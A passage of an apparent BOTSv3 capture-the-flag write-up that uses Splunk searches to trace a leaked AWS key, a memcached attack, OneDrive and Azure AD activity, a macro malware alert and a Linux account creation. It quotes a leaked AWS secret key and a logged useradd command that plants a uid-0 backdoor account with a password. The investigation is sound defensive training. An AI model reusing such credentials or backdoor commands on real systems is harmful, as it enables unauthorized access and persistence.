+<h3 id="220----aws-access-keys-consist-of-two-parts-an-access-key-id-eg-akiaiosfodnn7example-and-a-secret-access-key-eg-wjalrxutnfemik7mdengbpxrficyexamplekey-what-is-the-secret-access-key-of-the-key-that-was-leaked-to-the-external-code-repository">220 -|- AWS access keys consist of two parts: an access key ID (e.g., AKIAIOSFODNN7EXAMPLE) and a secret access key (e.g., wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY). What is the secret access key of the key that was leaked to the external code repository?</h3>
+<p>The email message from Q219 has a link to a Github repo stating the key was found there. So check the Github link. Also easy!</p>
+<blockquote>
+<p>Bx8/gTsYC98T0oWiFhpmdROqhELPtXJSR9vFPNGk</p>
+</blockquote>
+<p>Access key = AKIAJOGCDXJ5NW5PXUPA</p>
+<p>IAM user = web_admin</p>
+<p><br/><br/></p>
+<h3 id="221----using-the-leaked-key-the-adversary-makes-an-unauthorized-attempt-to-create-a-key-for-a-specific-resource-what-is-the-name-of-that-resource">221 -|- Using the leaked key, the adversary makes an unauthorized attempt to create a key for a specific resource. What is the name of that resource?</h3>
+<p>Search AWS logs for that key:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;*aws*&#34;</span> userIdentity.accessKeyId<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;AKIAJOGCDXJ5NW5PXUPA&#34;</span>
+</code></pre></div><p>9 events. <code>aws:cloudtrail</code> has an <code>eventName</code> field for creating keys:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ws:cloudtrail&#34;</span> userIdentity.accessKeyId<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;AKIAJOGCDXJ5NW5PXUPA&#34;</span>
+  eventName<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;CreateAccessKey&#34;</span>
+</code></pre></div><p>1 event. Check the <code>userIdentity.userName</code> (or <code>user</code>)</p>
+<blockquote>
+<p>nullweb_admin</p>
+</blockquote>
+<p>Time = 09:16:12</p>
+<p><br/><br/></p>
+<h3 id="222----using-the-leaked-key-the-adversary-makes-an-unauthorized-attempt-to-describe-an-account-what-is-the-full-user-agent-string-of-the-application-that-originated-the-request">222 -|- Using the leaked key, the adversary makes an unauthorized attempt to describe an account. What is the full user agent string of the application that originated the request?</h3>
+<p>Based on the previous search, but change the <code>eventName</code> to one for describing accounts, then check the <code>UserAgent</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;aws:cloudtrail&#34;</span> userIdentity.accessKeyId<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;AKIAJOGCDXJ5NW5PXUPA&#34;</span>
+  eventName<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;DescribeAccountAttributes&#34;</span>
+</code></pre></div><blockquote>
+<p>ElasticWolf/5.1.6</p>
+</blockquote>
+<p>Time = 09:27:06</p>
+<p><br/><br/></p>
+<h3 id="223----the-adversary-attempts-to-launch-an-ubuntu-cloud-image-as-the-compromised-iam-user-what-is-the-codename-for-that-operating-system-version-in-the-first-attempt">223 -|- The adversary attempts to launch an Ubuntu cloud image as the compromised IAM user. What is the codename for that operating system version in the first attempt?</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">(</span>AKIAJOGCDXJ5NW5PXUPA OR web_admin<span style="color:#f92672">)</span> ubuntu
+</code></pre></div><p>Nothing. Let&rsquo;s just search for the key or username and see what comes up:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">(</span>AKIAJOGCDXJ5NW5PXUPA OR web_admin<span style="color:#f92672">)</span>
+</code></pre></div><p>672 events, 661 are <code>aws:cloudtrail</code> as Q222. There&rsquo;s an <code>eventName</code> field with a <code>RunInstances</code> value, which looks promising:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">(</span>AKIAJOGCDXJ5NW5PXUPA OR web_admin<span style="color:#f92672">)</span>
+sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;aws:cloudtrail&#34;</span> eventName<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;RunInstances&#34;</span>
+| reverse
+</code></pre></div><p>576 events, although no mention of operating systems. However, there is a field <code>requestParameters.instancesSet.items{}.imageId</code> with 15 unique values. The value in the first event is <em>ami-41e0b93b</em>. AMI is Amazon Machine Image.</p>
+<p>Googling this phrase takes us to <a href="https://cloud-images.ubuntu.com/locator/" target="_blank">https://cloud-images.ubuntu.com/locator/</a>, which states this AMI relates to &ldquo;Ubuntu 16.04 xenial&rdquo;.</p>
+<p>There&rsquo;s also a link to <a href="https://aws.amazon.com/marketplace/pp/Canonical-Group-Limited-Ubuntu-1604-LTS-Xenial-HVM/B01JBL2M0O" target="_blank">https://aws.amazon.com/marketplace/pp/Canonical-Group-Limited-Ubuntu-1604-LTS-Xenial-HVM/B01JBL2M0O</a> - &ldquo;Ubuntu 16.04 Xenial&rdquo;</p>
+<p>It also seems possible to get this information using the AWS CLI: <a href="https://docs.aws.amazon.com/cli/latest/reference/ec2/describe-images.html" target="_blank">https://docs.aws.amazon.com/cli/latest/reference/ec2/describe-images.html</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">&gt; aws ec2 describe-images --image-id ami-41e0b93b --region us-east-1
+</code></pre></div><p>Which gives us &ldquo;Ubuntu 16.04 Xenial&rdquo;.</p>
+<p>Googling this phrase tells us the full name is &ldquo;Xenial Xerus&rdquo;</p>
+<blockquote>
+<p>Xenial Xerus</p>
+</blockquote>
+<p>Time = 09:16:22</p>
+<p>Source IP = 139.198.18.205</p>
+<p><br/><br/></p>
+<h3 id="224----frothly-uses-amazon-route-53-for-their-dns-web-service-what-is-the-average-length-of-the-distinct-third-level-subdomains-in-the-queries-to-brewertalkcom">224 -|- Frothly uses Amazon Route 53 for their DNS web service. What is the average length of the distinct third-level subdomains in the queries to brewertalk.com?</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;*aws*&#34;</span> dns brewertalk.com
+</code></pre></div><p>The source <code>lambda:DNS</code> seems to give the URLs, but there are &gt;115,000 of them.</p>
+<p>Using Splunk&rsquo;s field extractor, delimiting with spaces, the full URL can be turned into a field (I called it <code>ldns_url</code>).</p>
+<p>Now we can use the URL Toolbox Splunk app to split the <code>ldns_urls</code> into individual parts:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">source<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;lambda:dns&#34;</span> brewertalk.com
+| eval list<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;brewertalk&#34;</span> 
+| <span style="color:#e6db74">`</span>ut_parse_extended<span style="color:#f92672">(</span>ldns_url,list<span style="color:#f92672">)</span><span style="color:#e6db74">`</span>
+</code></pre></div><p>This gives us new fields. <code>ut_subdomain_level_1</code> is needed for this question, so remove duplicates, evaluate the length, and then take the average using stats:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">source<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;lambda:dns&#34;</span> brewertalk.com
+| eval list<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;brewertalk&#34;</span> 
+| <span style="color:#e6db74">`</span>ut_parse_extended<span style="color:#f92672">(</span>ldns_url,list<span style="color:#f92672">)</span><span style="color:#e6db74">`</span>
+| dedup ut_subdomain_level_1
+| eval length<span style="color:#f92672">=</span>len<span style="color:#f92672">(</span>ut_subdomain_level_1<span style="color:#f92672">)</span>
+| stats avg<span style="color:#f92672">(</span>length<span style="color:#f92672">)</span> as avglength
+</code></pre></div><blockquote>
+<p>8.1</p>
+</blockquote>
+<p><br/><br/></p>
+<h3 id="225----using-the-payload-data-found-in-the-memcached-attack-what-is-the-name-of-the-jpeg-file-that-is-used-by-taedonggang-to-deface-other-brewery-websites">225 -|- Using the payload data found in the memcached attack, what is the name of the .jpeg file that is used by Taedonggang to deface other brewery websites?</h3>
+<p>Doing some research on memcached attacks, I found an article by Cloudflare <a href="https://www.cloudflare.com/learning/ddos/memcached-ddos-attack/" target="_blank">https://www.cloudflare.com/learning/ddos/memcached-ddos-attack/</a> which mentions one of the main ways to stop it is to disable UDP. That could be a good place to start.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">source<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stream:udp&#34;</span>
+</code></pre></div><blockquote>
+<p>157,000 events, although first (chronologically most recent) result looks interesting:</p>
+</blockquote>
+<pre tabindex="0"><code>dest_content: $VALUE injected 0 50000 6HOUL@G3RpwnzFrothyl4Life6HOUL@G3RpwnzFrothyl4Life6HOUL@G3RpwnzFrothyl4Life[...]
+src_content: get injected
+src_ip: 13.125.33.130
+</code></pre><p><em>6HOUL@G3RpwnzFrothyl4Life</em> is repeated 437 times in the above <code>dest_content</code>. There are 3 events featuring this phrase in a repeated fashion, and 6 similar ones with the phrase <em>CRYP70KOL5CH-OWNS-YOU</em>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">(</span>*CRYP70KOL5CH* OR *6HOUL@G3R*<span style="color:#f92672">)</span>
+| table _time src_content dest_content
+| reverse
+</code></pre></div><p>Who/what is <em>6HOUL@G3R</em> and <em>CRYP70KOL5CH</em>? Googling turns up various sites, such as <a href="http://www.lilyandhops.com/" target="_blank">http://www.lilyandhops.com/</a> and <a href="http://brewsbyhildy.com/" target="_blank">http://brewsbyhildy.com/</a>, which look like they&rsquo;ve also been defaced. Check the image name they&rsquo;ve been defaced with.</p>
+<blockquote>
+<p>index1.jpeg</p>
+</blockquote>
+<p>Found web pages also mention &ldquo;74L15M4N@L&rdquo;, although nothing in BOTSv3 dataset matching this.</p>
+<p>As an aside, Taedonggang is a North Korean beer.</p>
+<p>Times = 15:11:35 ~ 15:27:09</p>
+<p><br/><br/></p>
+<h3 id="300----what-is-the-full-user-agent-string-that-uploaded-the-malicious-link-file-to-onedrive">300 -|- What is the full user agent string that uploaded the malicious link file to OneDrive?</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">onedrive
+</code></pre></div><p>The sourcetypes <code>o365:management:activity</code> and <code>ms:o365:management</code> look interesting:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">(</span>sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ms:o365:management&#34;</span> OR sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;o365:management:activity&#34;</span><span style="color:#f92672">)</span>
+  onedrive
+</code></pre></div><p>22 events. All have a <code>dvc</code> (device?) and a <code>Workload</code> of <code>OneDrive</code>, so replace the search with the field.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">(</span>sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ms:o365:management&#34;</span> OR sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;o365:management:activity&#34;</span><span style="color:#f92672">)</span>
+  Workload<span style="color:#f92672">=</span>OneDrive
+</code></pre></div><p>1658 events. Checking the fields again, there is an <code>operation</code> with <code>FileUploaded</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">(</span>sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ms:o365:management&#34;</span> OR sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;o365:management:activity&#34;</span><span style="color:#f92672">)</span>
+  Workload<span style="color:#f92672">=</span>OneDrive Operation<span style="color:#f92672">=</span>FileUploaded
+</code></pre></div><p>14 events, 7 for each sourcetype. A quick check shows they&rsquo;re duplicates, so remove one of the sourcetypes.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ms:o365:management&#34;</span> Workload<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;OneDrive&#34;</span> Operation<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;FileUploaded&#34;</span>
+</code></pre></div><p>Checking fields again, there are a couple that give filenames - <code>object</code>, <code>SourceFileName</code>. There are 7 unique filenames. Using a table with some fields that might help, we notice four uploads from the same source/user, three images and one .lnk, with a <code>UserAgent</code> relating to North Korea (ko-KP is the North Korean language, and Naenara (내나라) is the North Korean intranet)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ms:o365:management&#34;</span> Workload<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;OneDrive&#34;</span> Operation<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;FileUploaded&#34;</span>
+| table _time src_ip user object UserAgent
+| reverse
+</code></pre></div><blockquote>
+<p>Mozilla/5.0 (X11; U; Linux i686; ko-KP; rv: 19.1br) Gecko/20130508 Fedora/1.9.1-2.5.rs
+3.0 NaenaraBrowser/3.5b4</p>
+</blockquote>
+<p>Time = 09:57:17 (x3), 09:57:33</p>
+<p>Source IP = 104.207.83.63</p>
+<p>User - <a href="mailto:bgist@froth.ly">bgist@froth.ly</a></p>
+<p>Files = stout.png, stout-2.png, morebeer.jpg, BRUCE BIRTHDAY HAPPY HOUR PICS.lnk</p>
+<p><br/><br/></p>
+<h3 id="301----what-external-client-ip-address-is-able-to-initiate-successful-logins-to-frothly-using-an-expired-user-account">301 -|- What external client IP address is able to initiate successful logins to Frothly using an expired user account?</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">expired
+</code></pre></div><p>13 events. Checking the sourcetypes, there&rsquo;s one from <code>ms:aad:signin</code>, which makes sense for logins.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ms:aad:signin&#34;</span> expired 
+</code></pre></div><p>1 event:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json"><span style="color:#960050;background-color:#1e0010">failureReason:</span> <span style="color:#960050;background-color:#1e0010">Invalid</span> <span style="color:#960050;background-color:#1e0010">password,</span> <span style="color:#960050;background-color:#1e0010">entered</span> <span style="color:#960050;background-color:#1e0010">expired</span> <span style="color:#960050;background-color:#1e0010">password.</span>
+<span style="color:#960050;background-color:#1e0010">ipAddress:</span> <span style="color:#ae81ff">199.66</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#ae81ff">91.253</span>
+<span style="color:#960050;background-color:#1e0010">userDisplayName:</span> <span style="color:#960050;background-color:#1e0010">Kevin</span> <span style="color:#960050;background-color:#1e0010">Lagerfield</span>
+<span style="color:#960050;background-color:#1e0010">signinDateTime:</span> <span style="color:#ae81ff">2018-08-20</span><span style="color:#960050;background-color:#1e0010">T</span><span style="color:#ae81ff">11</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">43</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">14.7994359</span><span style="color:#960050;background-color:#1e0010">Z</span>
+</code></pre></div><p>Now to check if this is the correct one. Let&rsquo;s look at all Kevin&rsquo;s (name or email) MS Azure AD events (there are two sourcetypes, <code>ms:aad:signin</code> and <code>ms:aad:audit</code>), let&rsquo;s see if there is anything to suggest the account has expired, and to see if there were there successful logins after.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ms:aad:*&#34;</span> <span style="color:#f92672">(</span>*Kevin* OR *Lagerfield*<span style="color:#f92672">)</span>
+| reverse
+</code></pre></div><p>19 events, giving us a timeline. Here&rsquo;s a summary</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json"><span style="color:#960050;background-color:#1e0010">activity:</span> <span style="color:#960050;background-color:#1e0010">Update</span> <span style="color:#960050;background-color:#1e0010">user</span>
+<span style="color:#960050;background-color:#1e0010">activityDate:</span> <span style="color:#ae81ff">2018-08-20</span><span style="color:#960050;background-color:#1e0010">T</span><span style="color:#ae81ff">11</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">24</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">28.7368822</span><span style="color:#960050;background-color:#1e0010">Z</span>
+<span style="color:#960050;background-color:#1e0010">modifiedProperties:</span>
+   <span style="color:#960050;background-color:#1e0010">name:</span> <span style="color:#960050;background-color:#1e0010">AccountEnabled</span>
+   <span style="color:#960050;background-color:#1e0010">newValue:</span> [<span style="color:#66d9ef">true</span>]
+   <span style="color:#960050;background-color:#1e0010">oldValue:</span> [<span style="color:#66d9ef">false</span>]
+
+<span style="color:#960050;background-color:#1e0010">activity:</span> <span style="color:#960050;background-color:#1e0010">Reset</span> <span style="color:#960050;background-color:#1e0010">user</span> <span style="color:#960050;background-color:#1e0010">password</span>
+<span style="color:#960050;background-color:#1e0010">activityDate:</span> <span style="color:#ae81ff">2018-08-20</span><span style="color:#960050;background-color:#1e0010">T</span><span style="color:#ae81ff">11</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">41</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">36.4906486</span><span style="color:#960050;background-color:#1e0010">Z</span>
+
+<span style="color:#960050;background-color:#1e0010">signinDateTime:</span> <span style="color:#ae81ff">2018-08-20</span><span style="color:#960050;background-color:#1e0010">T</span><span style="color:#ae81ff">11</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">42</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">37.0910791</span><span style="color:#960050;background-color:#1e0010">Z</span>
+<span style="color:#960050;background-color:#1e0010">failureReason:</span> <span style="color:#960050;background-color:#1e0010">Invalid</span> <span style="color:#960050;background-color:#1e0010">username</span> <span style="color:#960050;background-color:#1e0010">or</span> <span style="color:#960050;background-color:#1e0010">password</span> <span style="color:#960050;background-color:#1e0010">or</span> <span style="color:#960050;background-color:#1e0010">Invalid</span> <span style="color:#960050;background-color:#1e0010">on-premise</span> <span style="color:#960050;background-color:#1e0010">username</span> <span style="color:#960050;background-color:#1e0010">or</span> <span style="color:#960050;background-color:#1e0010">password.</span>
+
+<span style="color:#960050;background-color:#1e0010">activity:</span> <span style="color:#960050;background-color:#1e0010">Reset</span> <span style="color:#960050;background-color:#1e0010">user</span> <span style="color:#960050;background-color:#1e0010">password</span>
+<span style="color:#960050;background-color:#1e0010">activityDate:</span> <span style="color:#ae81ff">2018-08-20</span><span style="color:#960050;background-color:#1e0010">T</span><span style="color:#ae81ff">11</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">42</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">51.0513891</span><span style="color:#960050;background-color:#1e0010">Z</span>
+
+<span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#960050;background-color:#1e0010">initial</span> <span style="color:#960050;background-color:#1e0010">event</span>
+<span style="color:#960050;background-color:#1e0010">signinDateTime:</span> <span style="color:#ae81ff">2018-08-20</span><span style="color:#960050;background-color:#1e0010">T</span><span style="color:#ae81ff">11</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">43</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">14.7994359</span><span style="color:#960050;background-color:#1e0010">Z</span>
+<span style="color:#960050;background-color:#1e0010">failureReason:</span> <span style="color:#960050;background-color:#1e0010">Invalid</span> <span style="color:#960050;background-color:#1e0010">password,</span> <span style="color:#960050;background-color:#1e0010">entered</span> <span style="color:#960050;background-color:#1e0010">expired</span> <span style="color:#960050;background-color:#1e0010">password.</span>
+
+<span style="color:#960050;background-color:#1e0010">activity:</span> <span style="color:#960050;background-color:#1e0010">Change</span> <span style="color:#960050;background-color:#1e0010">user</span> <span style="color:#960050;background-color:#1e0010">password</span>
+<span style="color:#960050;background-color:#1e0010">activityDate:</span> <span style="color:#ae81ff">2018-08-20</span><span style="color:#960050;background-color:#1e0010">T</span><span style="color:#ae81ff">11</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">43</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">22.5565538</span><span style="color:#960050;background-color:#1e0010">Z</span>
+
+<span style="color:#960050;background-color:#1e0010">activity:</span> <span style="color:#960050;background-color:#1e0010">Change</span> <span style="color:#960050;background-color:#1e0010">password</span> <span style="color:#960050;background-color:#1e0010">(self-service)</span>
+<span style="color:#960050;background-color:#1e0010">activityDate:</span> <span style="color:#ae81ff">2018-08-20</span><span style="color:#960050;background-color:#1e0010">T</span><span style="color:#ae81ff">11</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">43</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">22.5596423</span><span style="color:#960050;background-color:#1e0010">Z</span>
+</code></pre></div><p>All very interesting.</p>
+<blockquote>
+<p>199.66.91.253</p>
+</blockquote>
+<p><br/><br/></p>
+<h3 id="302----according-to-symantecs-website-what-is-the-discovery-date-of-the-malware-identified-in-the-macro-enabled-file">302 -|- According to Symantec&rsquo;s website, what is the discovery date of the malware identified in the macro-enabled file?</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">*macro*
+</code></pre></div><p>19 events. One of them is an email, with the following content:</p>
+<pre tabindex="0"><code>content_body: Here is a financial model we can use for FY2019 planning. For the worksheet to operate properly, you will need to enable macros. Thanks,Bruce
+
+attach_filename: Malware Alert Text.txt
+</code></pre><p>Somehow I doubt that was the original attachment name. A quick Google found <a href="https://www.law.upenn.edu/its/docs/office/office-365-ATP.php" target="_blank">https://www.law.upenn.edu/its/docs/office/office-365-ATP.php</a>:</p>
+<pre tabindex="0"><code>Office 365 Advanced Threat Protection (ATP)
+
+If an attachment is deemed unsafe and removed, 
+the system will substitute a text file named “Malware Alert Text.txt”
+</code></pre><p>What is the txt file? It is base64 encoded in the email <code>content</code>, so decode that with Cyberchef:</p>
+<pre tabindex="0"><code>Malware was detected in one or more attachments included with this email message. 
+Action: All attachments have been removed.
+Frothly-Brewery-Financial-Planning-FY2019-Draft.xlsm	 W97M.Empstage
+</code></pre><p>What is &ldquo;W97M.Empstage&rdquo;? Google and the first result is a Symantec page, but it&rsquo;s a forum thread with no info: <a href="https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=f5c4cf9d-e519-4bbc-9d4f-9f554460aade&amp;CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&amp;tab=librarydocuments" target="_blank">https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=f5c4cf9d-e519-4bbc-9d4f-9f554460aade&amp;amp;CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&amp;amp;tab=librarydocuments</a></p>
+<p>The next result is titled &ldquo;W97M.Empstage Technical Details | Symantec&rdquo; with the date on Google Nov 12, 2016. However, if you follow that link <a href="http://co.norton.com/security_response/writeup.jsp?docid=2016-111123-2000-99&amp;tabid=2" target="_blank">http://co.norton.com/security_response/writeup.jsp?docid=2016-111123-2000-99&amp;amp;tabid=2</a> it redirects you to <a href="https://co.norton.com/" target="_blank">https://co.norton.com/</a>, which is Norton&rsquo;s Colombian website.</p>
+<p>But apparently that&rsquo;s the correct link. Because Symantec acquired Norton, and Broadcom acquired Symantec (the latter happening after BOTSv3 was made).</p>
+<p>As for why Colombia, no idea.</p>
+<p>So&hellip; Yeah. The answer is 11/11/2016. Presumably the day before Google found it.</p>
+<blockquote>
+<p>11/11/2016</p>
+</blockquote>
+<p><br/><br/></p>
+<h3 id="303----what-is-the-password-for-the-user-that-was-successfully-created-by-the-user-root-on-the-on-premises-linux-system">303 -|- What is the password for the user that was successfully created by the user &ldquo;root&rdquo; on the on-premises Linux system?</h3>
+<p>Linux uses &ldquo;adduser&rdquo; or &ldquo;useradd&rdquo; to create a new user, so start with that.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">(</span>adduser OR useradd<span style="color:#f92672">)</span>
+</code></pre></div><p>2896 events. Looking at the sources, <code>/var/log/auth.log</code> has a single event:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">source<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/var/log/auth.log&#34;</span> <span style="color:#f92672">(</span>adduser OR useradd<span style="color:#f92672">)</span>
+</code></pre></div><p>There is a <code>useradd</code> for user <code>tomcat7</code>. Let&rsquo;s look into tomcat7 with root a.k.a. uid 0.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">tomcat <span style="color:#f92672">(</span>root OR uid<span style="color:#f92672">=</span>0<span style="color:#f92672">)</span>
+</code></pre></div><p>7 events. One event from <code>osquery:results</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json"><span style="color:#960050;background-color:#1e0010">action:</span> <span style="color:#960050;background-color:#1e0010">added</span>
+<span style="color:#960050;background-color:#1e0010">calendarTime:</span> <span style="color:#960050;background-color:#1e0010">Mon</span> <span style="color:#960050;background-color:#1e0010">Aug</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">11</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">24</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">54</span> <span style="color:#ae81ff">2018</span> <span style="color:#960050;background-color:#1e0010">UTC</span>
+<span style="color:#960050;background-color:#1e0010">cmdline:</span> <span style="color:#e6db74">&#34;useradd&#34;</span> <span style="color:#e6db74">&#34;-ou&#34;</span> <span style="color:#e6db74">&#34;tomcat7&#34;</span> <span style="color:#e6db74">&#34;-p&#34;</span> <span style="color:#e6db74">&#34;ilovedavidverve&#34;</span> <span style="color:#e6db74">&#34;0&#34;</span> <span style="color:#e6db74">&#34;-g&#34;</span> <span style="color:#e6db74">&#34;0&#34;</span> <span style="color:#e6db74">&#34;-M&#34;</span> <span style="color:#e6db74">&#34;-N&#34;</span> <span style="color:#e6db74">&#34;-r&#34;</span> <span style="color:#e6db74">&#34;-s&#34;</span> <span style="color:#e6db74">&#34;/bin/bash&#34;</span>
+<span style="color:#960050;background-color:#1e0010">decorations:username:</span> <span style="color:#960050;background-color:#1e0010">root</span>
+</code></pre></div><blockquote>
+<p>ilovedavidverve</p>
+</blockquote>
+<p>Time = 11:24:54</p>
+<p><strong>Bonus</strong></p>
+<p>There are actually two <code>osquery:results</code> events for <em>tomcat7</em>:</p>
